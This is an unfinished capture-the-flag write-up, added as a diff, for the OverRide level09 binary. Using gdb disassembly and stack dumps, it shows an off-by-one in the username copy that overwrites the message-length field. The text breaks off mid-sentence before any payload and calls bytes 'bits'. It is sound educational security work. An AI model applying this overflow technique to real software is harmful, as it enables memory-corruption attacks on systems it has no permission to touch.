@@ -1,0 +1,219 @@
+For this exercise we have an "interface" which asks us for a username and then a message.
+let's try to make segfault.
+
+
+level09@OverRide:~$ ./level09 
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
+>>: >: Msg sent!
+level09@OverRide:~$ ./level09 
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: AAAA
+>: Welcome, AAAA
+>: Msg @Unix-Dude
+>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+>: Msg sent!
+
+
+Ok for now it's impossible. Let's analysis the asm code.
+
+Dump of assembler code for function handle_msg:
+		....
+   0x00000000000008cb <+11>:	lea    -0xc0(%rbp),%rax
+   0x00000000000008d2 <+18>:	add    $0x8c,%rax
+   0x00000000000008d8 <+24>:	movq   $0x0,(%rax)
+   0x00000000000008df <+31>:	movq   $0x0,0x8(%rax)
+   0x00000000000008e7 <+39>:	movq   $0x0,0x10(%rax)
+   0x00000000000008ef <+47>:	movq   $0x0,0x18(%rax)
+   0x00000000000008f7 <+55>:	movq   $0x0,0x20(%rax)
+   0x00000000000008ff <+63>:	movl   $0x8c,-0xc(%rbp)
+		....
+
+Let's look this buffer after file it.
+
+(gdb) disass
+Dump of assembler code for function handle_msg:
+		...
+   0x000055555555491f <+95>:	callq  0x555555554932 <set_msg>
+=> 0x0000555555554924 <+100>:	lea    0x295(%rip),%rdi        # 0x555555554bc0
+   0x000055555555492b <+107>:	callq  0x555555554730 <puts@plt>
+   0x0000555555554930 <+112>:	leaveq 
+   0x0000555555554931 <+113>:	retq   
+End of assembler dump.
+
+(gdb) x/100wx $rbp -0xc0
+0x7fffffffe500:	0x42424242	0x42424242	0x0000000a	0x00000000	<---- This is our msg | 0x7fffffffe58c - 0x7fffffffe500 = 0x8c
+0x7fffffffe510:	0x00000000	0x00000000	0x00000000	0x00000000		so we have 0x8c = 140 bit size
+0x7fffffffe520:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe530:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe540:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe550:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe560:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe570:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe580:	0x00000000	0x00000000	0x00000000	0x41414141	<---- This is our username | 0x7fffffffe5b4 - 0x7fffffffe58c = 0x28 
+0x7fffffffe590:	0x41414141	0x0000000a	0x00000000	0x00000000		so we have 0x28 = 40 bit size
+0x7fffffffe5a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe5b0:	0x00000000	0x0000008c	0xffffe5d0	0x00007fff	<---- And this is a value set for size msg in handle_msg
+
+let's now look how string are take.
+
+For username:
+
+   0x0000555555554a23 <+86>:	mov    (%rax),%rax
+   0x0000555555554a26 <+89>:	mov    %rax,%rdx
+   0x0000555555554a29 <+92>:	lea    -0x90(%rbp),%rax
+   0x0000555555554a30 <+99>:	mov    $0x80,%esi
+   0x0000555555554a35 <+104>:	mov    %rax,%rdi
+   0x0000555555554a38 <+107>:	callq  0x555555554770 <fgets@plt>    		<---- here a simple fgets with 0x80 = 128 bit size.
+   0x0000555555554a3d <+112>:	movl   $0x0,-0x4(%rbp)
+
+   0x0000555555554a44 <+119>:	jmp    0x555555554a6a <set_username+157>	<---- And here a loop for past buffer
+   0x0000555555554a46 <+121>:	mov    -0x4(%rbp),%eax
+   0x0000555555554a49 <+124>:	cltq   
+   0x0000555555554a4b <+126>:	movzbl -0x90(%rbp,%rax,1),%ecx
+   0x0000555555554a53 <+134>:	mov    -0x98(%rbp),%rdx
+   0x0000555555554a5a <+141>:	mov    -0x4(%rbp),%eax
+   0x0000555555554a5d <+144>:	cltq   
+   0x0000555555554a5f <+146>:	mov    %cl,0x8c(%rdx,%rax,1)
+   0x0000555555554a66 <+153>:	addl   $0x1,-0x4(%rbp)
+   0x0000555555554a6a <+157>:	cmpl   $0x28,-0x4(%rbp)				<---- loop size is 0x28
+   0x0000555555554a6e <+161>:	jg     0x555555554a81 <set_username+180>	<---- Jump when cmp is greater of 0x28, OH so he take one char too much!
+
+Ok so we caan send 41 and not 40 char for username, so we can overwrite the sizez of msg!
+
+let's look set_msg quickly.
+
+   0x0000555555554981 <+79>:	mov    0x201630(%rip),%rax        # 0x555555755fb8
+   0x0000555555554988 <+86>:	mov    (%rax),%rax
+   0x000055555555498b <+89>:	mov    %rax,%rdx
+   0x000055555555498e <+92>:	lea    -0x400(%rbp),%rax
+   0x0000555555554995 <+99>:	mov    $0x400,%esi
+   0x000055555555499a <+104>:	mov    %rax,%rdi
+   0x000055555555499d <+107>:	callq  0x555555554770 <fgets@plt>		<---- Simple fgets with 0x400 = 1024bits size.
+   0x00005555555549a2 <+112>:	mov    -0x408(%rbp),%rax
+   0x00005555555549a9 <+119>:	mov    0xb4(%rax),%eax
+   0x00005555555549af <+125>:	movslq %eax,%rdx
+   0x00005555555549b2 <+128>:	lea    -0x400(%rbp),%rcx
+   0x00005555555549b9 <+135>:	mov    -0x408(%rbp),%rax
+   0x00005555555549c0 <+142>:	mov    %rcx,%rsi
+   0x00005555555549c3 <+145>:	mov    %rax,%rdi
+   0x00005555555549c6 <+148>:	callq  0x555555554720 <strncpy@plt>		<---- And strncpy, with buf and -0x408(%rbp) os size of 
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+overwrite size =
+
+(gdb) disass
+Dump of assembler code for function handle_msg:
+   0x00005555555548c0 <+0>:	push   %rbp
+   0x00005555555548c1 <+1>:	mov    %rsp,%rbp
+   0x00005555555548c4 <+4>:	sub    $0xc0,%rsp
+   0x00005555555548cb <+11>:	lea    -0xc0(%rbp),%rax
+   0x00005555555548d2 <+18>:	add    $0x8c,%rax
+   0x00005555555548d8 <+24>:	movq   $0x0,(%rax)
+   0x00005555555548df <+31>:	movq   $0x0,0x8(%rax)
+   0x00005555555548e7 <+39>:	movq   $0x0,0x10(%rax)
+   0x00005555555548ef <+47>:	movq   $0x0,0x18(%rax)
+   0x00005555555548f7 <+55>:	movq   $0x0,0x20(%rax)
+   0x00005555555548ff <+63>:	movl   $0x8c,-0xc(%rbp)
+   0x0000555555554906 <+70>:	lea    -0xc0(%rbp),%rax
+   0x000055555555490d <+77>:	mov    %rax,%rdi
+   0x0000555555554910 <+80>:	callq  0x5555555549cd <set_username>
+   0x0000555555554915 <+85>:	lea    -0xc0(%rbp),%rax
+=> 0x000055555555491c <+92>:	mov    %rax,%rdi
+   0x000055555555491f <+95>:	callq  0x555555554932 <set_msg>
+   0x0000555555554924 <+100>:	lea    0x295(%rip),%rdi        # 0x555555554bc0
+   0x000055555555492b <+107>:	callq  0x555555554730 <puts@plt>
+   0x0000555555554930 <+112>:	leaveq 
+   0x0000555555554931 <+113>:	retq   
+End of assembler dump.
+(gdb) x/100x $rbp -0xc0
+0x7fffffffe500:	0x0000000a	0x00000000	0x55554c69	0x00005555
+0x7fffffffe510:	0xf7ff7000	0x00007fff	0xf7a94713	0x00007fff
+0x7fffffffe520:	0xf7dd4260	0x00007fff	0xf7dd4260	0x00007fff
+0x7fffffffe530:	0x0000000a	0x00000000	0xf7ff7000	0x00007fff
+0x7fffffffe540:	0x0000002d	0x00000000	0xf7a945da	0x00007fff
+0x7fffffffe550:	0x00000086	0x00000000	0x0000002d	0x00000000
+0x7fffffffe560:	0x0000000a	0x00000000	0x55554c10	0x00005555
+0x7fffffffe570:	0xffffe6b0	0x00007fff	0xf7a95d45	0x00007fff
+0x7fffffffe580:	0xf7dd4260	0x00007fff	0xf7a9608f	0x41414141
+0x7fffffffe590:	0x0000000a	0x00000000	0x00000000	0x00000000
+0x7fffffffe5a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe5b0:	0x00000000	0x0000008c	0xffffe5d0	0x00007fff	<------ size msg = 0x8c
+0x7fffffffe5c0:	0xffffe5d0	0x00007fff	0x55554abd	0x00005555
+0x7fffffffe5d0:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff
+
+
+Send max Ai:
+
+   0x0000555555554a26 <+89>:	mov    %rax,%rdx
+   0x0000555555554a29 <+92>:	lea    -0x90(%rbp),%rax
+   0x0000555555554a30 <+99>:	mov    $0x80,%esi			0x80 = 128
+   0x0000555555554a35 <+104>:	mov    %rax,%rdi
+   0x0000555555554a38 <+107>:	callq  0x555555554770 <fgets@plt>
+
+A * 128 
+
+>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, 0x0000555555554a3d in set_username ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x000055555555491c in handle_msg ()
+(gdb) x/100x $rbp -0xc0
+0x7fffffffe500:	0x0000000a	0x00000000	0x55554c69	0x00005555
+0x7fffffffe510:	0xf7ff7000	0x00007fff	0xf7a94713	0x00007fff
+0x7fffffffe520:	0xf7dd4260	0x00007fff	0xf7dd4260	0x00007fff
+0x7fffffffe530:	0x0000000a	0x00000000	0xf7ff7000	0x00007fff
+0x7fffffffe540:	0x0000002d	0x00000000	0xf7a945da	0x00007fff
+0x7fffffffe550:	0x00000086	0x00000000	0x0000002d	0x00000000
+0x7fffffffe560:	0x0000000a	0x00000000	0x55554c10	0x00005555
+0x7fffffffe570:	0xffffe6b0	0x00007fff	0xf7a95d45	0x00007fff
+0x7fffffffe580:	0xf7dd4260	0x00007fff	0xf7a9608f	0x41414141
+0x7fffffffe590:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe5a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe5b0:	0x41414141	0x00000041	0xffffe5d0	0x00007fff      <----- ovewite size msg
+
